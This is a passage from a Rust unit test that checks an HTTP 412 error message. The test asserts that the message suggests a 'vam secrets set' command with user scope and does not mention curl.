            "/v1/runs",
            412,
            &with_denials(MISSING, serde_json::json!([d])),
        )
        .to_string();
        assert!(
            text.contains("vam secrets set <BINDING_ID> --scope user"),
            "{text}"
        );
        assert!(!text.contains("curl"), "{text}");
    }
}
